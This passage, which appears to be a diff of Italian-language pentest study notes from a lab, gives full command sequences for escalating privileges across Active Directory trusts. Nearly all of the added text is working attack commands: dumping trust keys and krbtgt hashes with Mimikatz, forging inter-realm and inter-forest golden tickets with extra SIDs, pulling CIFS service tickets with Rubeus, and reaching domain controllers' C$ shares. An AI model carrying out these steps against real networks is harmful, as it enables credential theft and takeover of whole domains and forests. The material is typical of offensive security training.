@@ -400,17 +400,57 @@ Execute the task
 			- net user claudione /domain
 ```
 
-
-## Trust Flow Across Forest
+## Trusting tra domini nella foresta
+### I domini nelle foreste hanno una implicita 2-way trust con altri domini. 2 modi per fare priv esc tra 2 domini in una foresta. Tramite krbtgt hash o Trust tickets
 <img src="Trust_flow_across_forest.png" width="400">
+
+## Trust Flow  with trust tickets
 <img src="Trust_flow_across_forest_1.png" width="400">
 
-### Da un DC domain possiamo forgiare un TGT (Golden Ticket) per un Enterprise Admins. Passiamo da un Domain Admins ad un Enterprise Admins (riconosciuto perchè il suo SID finisce con 519. Possiede l'accesso amministrativo a tutti i domini in una foresta)
+### Da un DC  possiamo forgiare un TGT (Golden Ticket) per un Enterprise Admins. Passiamo da un Domain Admins ad un Enterprise Admins (riconosciuto perchè il suo SID finisce con 519. Possiede l'accesso amministrativo a tutti i domini in una foresta)
+```
+			- powershell -ep bypass
+			- Get-ADTrust -Filter * (verifichiamo la relazione tra padre e figlio che sia bidirezionale)
+			- Import-Module Invoke-Mimikatz.ps1
+			- Get-DomainSID -Domain [dominio di Enterprise Admins]
+			
+			- Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName enterprise.dc (trust key)
+			o
+			- Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"' 
+			
+			- Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:[FQDN dominio corrente] /sid: [SID dominio corrente] /sids:[SID Domain Enterprise] /rc4:[HASH trust key] /service:krbtgt (target service nel dominio parente) /target: [FQDN dominio parente] /ticket:[PATH dove il ticket verrà salvato] (Inter-realm TGT viene forgiato)
+			
+			- Rubeus.exe asktgs  /ticket: percorso ticket  /servizio: tipo di servizio [cifs/mcorpdc.moneycorp.local]  /dc: controller di dominio [mcorp-dc.moneycorp.local]  /ptt (Ottengo TGS per il servizio CIFS del dominio target quindi quello di Enterprise Admins)
+			- klist (verifico di avere il ticket TGS)
+			- ls \\mcorpdc.moneycorp.local\C$
+```
+
+## Trust Flow  with krbtgt hash
+
+```
+			- powershell -ep bypass
+			- Get-ADTrust -Filter * (verifichiamo la relazione tra padre e figlio che sia bidirezionale)
+			- Import-Module Invoke-Mimikatz.ps1
+			- Get-DomainSID -Domain [dominio di Enterprise Admins]
+			- Invoke-Mimikatz -Command '"lsadump::trust /patch"' (get krbtgt)
+			- Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:[FQDN dominio corrente] /sid: [SID dominio corrente] /sids:[SID Domain Enterprise] /krbtgt:[HASH] /ticket:[PATH dove il ticket verrà salvato] (Inter-realm TGT viene forgiato)
+			- Invoke-Mimikatz -Command '"kerberos::ptt [path ticket.kirbi]
+			- ls \\mcorpdc.moneycorp.local\C$
+```
+## Trust FLow Across Forest
+## Across the Forest usando Trust Ticket
 ```
 			- powershell -ep bypass
 			- Import-Module Invoke-Mimikatz.ps1
-			- Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:tech.finance.corp /sid:[SID Dominio di partenza] /sids:[SID Domain Enterprise] /krbtgt:[HASH] /ticket:C:\Users\studentuser\Desktop\krbtgt_txt.kirbi"
-			- Invoke-Mimikatz -Command '"kerberos:ptt C:\Users\studentuser\Desktop\krbtgt_txt.kirbi"'
-			- ls \\finance-dc.finance.corp\C$
+			- Get-DomainSID -Domain [dominio di Enterprise Admins]
+			
+			- Invoke-Mimikatz -Command '"lsadump::trust /patch"' (trust key)
+			o
+			- Invoke-Mimikatz -Command '"lsadump::lsa /patch"' (trust key)
+			
+			- Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:[FQDN dominio corrente] /sid: [SID dominio corrente] /sids:[SID dominio altra foresta] /rc4:[HASH trust key] /service:krbtgt (target service nel dominio parente) /target: [FQDN dominio altra foresta] /ticket:[PATH dove il ticket verrà salvato] (Inter-forest TGT viene forgiato)
+			
+			- Rubeus.exe asktgs  /ticket: percorso ticket  /servizio: tipo di servizio [cifs/FQDN altra foresta]  /dc: [FQDN controller di dominio di dominio di altra foresta]  /ptt (Ottengo TGS per il servizio CIFS del dominio target quindi quello di Enterprise Admins)
+			- klist (verifico di avere il ticket TGS)
+			- ls \\mcorpdc.moneycorp.local\C$
 ```
-
